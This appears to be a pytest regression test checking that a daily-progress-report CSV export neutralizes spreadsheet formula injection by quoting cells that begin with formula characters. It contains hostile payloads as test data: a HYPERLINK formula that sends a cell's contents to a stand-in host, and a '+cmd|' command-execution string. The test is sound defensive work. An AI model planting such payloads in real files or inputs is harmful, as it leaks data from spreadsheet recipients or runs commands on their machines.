"""R2-266 - the DPR CSV export must not emit executable formulas.

The export wrote notes / issues / materials / author (free text a user
controls) straight into cells, so a note of
`=HYPERLINK("http://x/?"&A1,"click")` executed in the recipient's
spreadsheet when the emailed export was opened.

Gate: any cell whose value begins with = + - @ TAB or CR is exported with a
leading single quote (forced text), benign values pass through untouched,
and numbers are never quoted.
"""
import csv
import io
import uuid
from datetime import datetime

from app import models

_SUFFIX = uuid.uuid4().hex[:8]


def test_r2_266_dpr_export_neutralizes_formula_cells(client, db, make_tenant, auth_headers):
    comp, user, team = make_tenant(
        company_name=f"R2266-{_SUFFIX}", user_name="U2266",
        mobile=f"+9192{_SUFFIX}", email=f"r2266-{_SUFFIX}@test.com",
    )
    hdr = auth_headers(user, comp)
    project = models.Project(
        id=uuid.uuid4(), company_id=comp.id, name="P2266",
        code=f"PRJ-2266-{_SUFFIX}", status="Ongoing",
    )
    db.add(project)
    db.commit()

    r = client.post(
        "/apis/v3/dpr",
        headers=hdr,
        json={
            "project_id": str(project.id),
            "dpr_date": datetime(2026, 8, 20).isoformat(),
            "executed_qty": 1.0,
            "notes": '=HYPERLINK("https://zz.example/?d="&A1,"ZZ CLICK")',
            "issues": "+cmd|'/c calc'!A1",
        },
    )
    assert r.status_code == 201, r.text

    r2 = client.post(
        "/apis/v3/dpr",
        headers=hdr,
        json={
            "project_id": str(project.id),
            # distinct date so the duplicate-date 409 does not fire
            "dpr_date": datetime(2026, 8, 21).isoformat(),
            "executed_qty": 2.5,
            "notes": "benign casting note",
        },
    )
    assert r2.status_code == 201, r2.text

    r = client.get(f"/apis/v3/dpr/export?project_id={project.id}", headers=hdr)
    assert r.status_code == 200, r.text
    assert "text/csv" in r.headers.get("content-type", ""), r.headers

    rows = list(csv.reader(io.StringIO(r.text)))
    data = [row for row in rows[1:] if row]
    assert len(data) == 2, r.text

    by_notes = {row[4]: row for row in data}
    # The formula payloads are stored and exported as inert text.
    evil = by_notes["'=HYPERLINK(\"https://zz.example/?d=\"&A1,\"ZZ CLICK\")"]
    assert evil[7] == "'+cmd|'/c calc'!A1", evil

    # A benign note is untouched - no spurious quote prefix.
    benign = by_notes["benign casting note"]
    assert float(benign[3]) == 2.5, benign

    # No raw line in the file may start with a formula character.
    body_lines = [ln for ln in r.text.splitlines()[1:] if ln]
    assert all(not ln.startswith(("=", "+", "-", "@")) for ln in body_lines), body_lines[:3]
